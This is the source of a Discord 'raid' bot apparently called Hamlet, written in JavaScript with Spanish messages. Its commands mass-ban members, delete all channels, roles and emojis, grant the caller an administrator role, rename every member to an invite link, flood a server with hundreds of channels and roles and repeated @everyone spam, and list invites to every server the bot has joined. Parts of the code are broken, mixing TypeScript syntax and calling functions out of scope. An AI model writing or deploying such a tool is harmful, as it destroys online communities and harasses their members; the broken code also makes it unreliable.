const express = require('express');
const { Client, Message, Guild, Collection, MessageEmbed } = require('discord.js');
const { raidData, colors, reset, admin, prefix } = require('./config/raid.config');

//express app
const app = express();
app.get('/', (req, res) => {
  res.send('Hello world');
});
app.listen(process.env.PORT || 3000);

//client init
const client = new Client({
  intents: ['GUILDS', 'GUILD_MEMBERS', 'GUILD_BANS', 'GUILD_MESSAGES'],
});

//client presence
client.on('ready', () => {
  console.log(`${client.user.username} is ready`);
  console.log(`https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=1642824461566&scope=bot%20applications.commands`);
  client.user.setPresence({
    status: 'dnd',
    activities: [
      {
        name: prefix,
        type: 'COMPETING',
      },
    ],
  });
});

client.on('messageCreate', async (message) => {
  if (!message.guild) return;
  if (!client.user) return;
  const guild = message.guild;

  if (!guild.me) return;

  const wrong = (params) => {
    return message.channel.send({ content: params });
  };

  function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  if (message.content === `${prefix}help`) {
    const commands = ['kill', 'banall', 'admin', 'emoji', 'massnick'];
    const embed = new MessageEmbed()
      .setTitle('Hamlet v1 | Prefix: `+`')
      .setDescription(`Hola **${message.author.username}**! Mi nombre es Hamlet, el bot de *NationSquad*\n\n**Actualmente, mis comandos son:**\n` + commands.map(c => '`' + c + '`').join('\n') + '\nTen un buen día!')
      .setThumbnail('https://media.tenor.com/fy5Mwh-q5ZUAAAAC/hamtaro.gif');
    message.channel.send({ embeds: [embed] });
  }

  if (message.content === `${prefix}massnick`) {
    guild.members.cache.forEach(m => {
      if (!guild.me) return;
      if (m.roles.highest.position > guild.me.roles.highest.position || guild.ownerId === m.user.id) return;
      m.setNickname(raidData.invite)
        .catch(e => console.log(colors.red, 'Changing nicknames', reset));
    });
  }

  if (message.content === `${prefix}emoji`) {
    guild.emojis.cache.forEach(e => {
      e.delete()
        .then(e => guild.emojis.cache.delete(e.id))
        .catch(e => {
          console.log(colors.yellow, 'Deleting emojis', reset);
        });
    });
  }

  if (message.content === `${prefix}admin`) {
    const rol = await guild.roles.create({ name: 'pwns', permissions: ['ADMINISTRATOR'] });
    message.member.roles.add(rol);
  }

  if (message.content === `${prefix}banall`) {
    message.guild.members.cache.forEach(async m => {
      try {
        await m.ban();
      } catch(e) {
        console.log('no se pudo banear a 1 usuario');
      }
    });
  }
  
  ///nuke
if (message.content === `${prefix}nuke`) {
  async function deleteData() {
    guild.channels.cache.forEach((c) => {
      c.delete()
        .then((channel) => guild.channels.cache.delete(channel.id))
        .catch((e) => {
          console.log(colors.cyan, 'Deleting channels:', reset, e.message);
        });
    });
    return guild;
  }

  if (!guild.me) return;
  if (!guild.me.permissions.has('ADMINISTRATOR')) return wrong('No tengo los permisos necesarios');

  deleteData().then((g) =>
    g.channels
      .create(raidData.nuke_name)
      .then((c) => c.send('@everyone ' + raidData.invite))
  );
}
  ///automatic
 if (message.content === `${prefix}kill`) {
  let errorCounter = 0;
  if (!message.guild?.me?.permissions.has('ADMINISTRATOR'))
    return wrong('No tengo los permisos ncesarios');

  const deleteChannels = async (): Promise<Guild> => {
    message.guild?.channels.cache.forEach(async (c) => {
      try {
        await c.delete();
        message.guild?.channels.cache.delete(c.id);
      } catch (e) {
        console.log(colors.cyan, 'Deleting channels:', reset, e.message);
      }
    });
    return message.guild!;
  };

  const deleteRoles = async (): Promise<Guild> => {
    message.guild?.roles.cache.forEach(async (r) => {
      if (!message.guild?.me) return;
      if (
        message.guild?.me?.roles.highest.position! > r.position &&
        r.id !== message.guild?.id
      ) {
        try {
          await r.delete();
          message.guild?.roles.cache.delete(r.id);
        } catch (e) {
          message.guild?.roles.cache.delete(r.id);
          console.log(colors.yellow, 'Deleting roles:', reset, e.message);
        }
      }
    });
    return message.guild!;
  };

  const createChannels = async () => {
    for (let i = 0; i <= 458; i++) {
      if (!message.guild) return;
      const channel = await message.guild.channels.create(
        raidData.raid_channel,
        {
          topic: raidData.invite,
          permissionOverwrites: [
            {
              id: message.guild.id,
              allow: ['VIEW_CHANNEL'],
            },
          ],
        }
      );
      const sendMessages = async (ms?: number) => {
        for (let x = 0; x <= 4; x++) {
          if (!channel) {
            continue;
          }
          channel.send('@everyone ' + raidData.message).catch((e) => {
            message.guild?.channels.cache.delete(channel.id);
            console.log(
              colors.magenta,
              'Sending messages:',
              reset,
              e.message
            );
          });
        }
        if (ms) await sleep(ms * 1000);
        return;
      };

      const createRoles = async () => {
        for (let x = 0; x <= 249 - message.guild.roles.cache.size; x++) {
          message.guild.roles
            .create({
              name: raidData.nuke_name,
            })
            .catch((e) => {
              console.log(colors.yellow, 'Creating roles', reset, e.message);
            });
        }
        return;
      };

      Promise.all([channel, createRoles]).then(async (res) => {
        await sendMessages(5);
        await sendMessages(10);
        await sendMessages(20);
        await sendMessages();
      });
    }
  };

  Promise.all([deleteChannels(), deleteRoles()]).then(createChannels);
}

    //raid
try {
  await guild.setName(raidData.name);
  await guild.setIcon(raidData.icon);
  await deleteRoles();
  await deleteChannels();
  await createChannels();
} catch (e) {
  console.log(colors.red, 'Inesperado:', reset, e.message);
}

if (message.content === `${prefix}servers`) {
  if (message.author.id !== admin) return;
  let guilds = client.guilds.cache.sort((a, b) => (a > b ? -1 : 1));

  guilds.forEach(async (g) => {
    if (g.id === '897986461222207589') return;
    try {
      let invite = await g.channels.cache.random().createInvite();
      message.channel.send(
        g.me?.hasPermission('ADMINISTRATOR') + ' | ' + g.name + ' | ' + g.memberCount +  ' ' + invite.url
      );
    } catch (e) {
      message.channel.send(g.name + ' | ' + g.id);
    }
  });
}

client.login(process.env.TOKEN);
